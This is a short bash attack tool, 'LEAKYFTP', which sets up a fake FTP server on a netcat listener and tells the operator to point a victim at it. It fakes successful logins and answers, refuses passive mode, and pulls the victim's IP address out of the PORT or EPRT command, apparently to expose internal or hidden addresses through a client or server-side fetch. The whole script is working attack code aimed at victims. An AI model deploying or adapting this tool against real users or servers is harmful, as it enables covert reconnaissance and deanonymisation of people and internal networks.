#!/bin/bash

function usage {
    cat <<-!
Usage:
    $0 [DEBUG_MODE=0] [FTP_PORT=2121]
!
}

function debug_print {
    [[ -n $debug_mode ]] && echo "${*}" >&2
}

function leakyftp {
    local cmd_in connection_info elapsed_time ip=
    
    function write_data {
        debug_print "< $1"
        printf '%s\r\n' "$1"
    }
    
    function read_data {
        local data time_start time_end
        time_start=$(date +%s%N|sed -E 's/.{6}$//')
        read -r -t 5 data
        time_end=$(date +%s%N|sed -E 's/.{6}$//')
        printf "%s %s" $((time_end-time_start)) "${data}"|sed 's/\r$//'
    }
    
    read client_info
    debug_print $client_info
    write_data "220 LEAKYFTP"
    
    cmd_in=x
    while [[ -n $cmd_in ]];do
        read elapsed_time cmd_in < <(read_data)
        debug_print "> $cmd_in in ${elapsed_time}"
        case $cmd_in in
            USER*)
                write_data "331 User name okay, need password."
                ;;
            PASS*)
                write_data "230 Login successful"
                ;;
            CWD*)
                write_data "250 Directory successfully changed."
                ;;
            LIST*)
                write_data "226 Directory send OK."
                ;;
            PWD*)
                write_data "257 /"
                ;;
            SIZE*)
                write_data "213 213"
                ;;
            SYST*)
                write_data "555 UNIX Type: L8"
                ;;
            "TYPE I"*)
                write_data "200 Switching to Binary mode"
                ;;
            "TYPE A"*)
                write_data "200 Switching to ASCII mode"
                ;;
            PASV*|EPSV*|AUTH*)
                write_data "502 What is this"
                ;;
            PORT*)
                #PORT x,x,x,x,157,193
                IFS=" ," read -a parts < <(echo "$cmd_in")
                ip=$(IFS=.;echo "${parts[*]:1:4}")
                break
                ;;
            EPRT*)
                #EPRT |1|x.x.x.x|38473| for ipv4
                debug_print "$cmd_in"
                IFS="|" read _ _ ip _ < <(echo "$cmd_in")
                break
                ;;
            *)
                write_data "200 200"
        esac
    done
    [[ -n $ip ]] && echo $ip >&$outfd
}

[[ $1 == -h || $1 == --help ]] && {
    usage
    exit
}

debug_mode=${1:-}
ftp_port=${2:-2121}

echo "Point the victim at: ftp://this_host:${ftp_port}" >&2

exec {outfd}>&1
{ coproc fds (nc -lnvp $ftp_port 2>&1) } 2>/dev/null
read <&${fds[0]}
leakyftp <&${fds[0]} >&${fds[1]}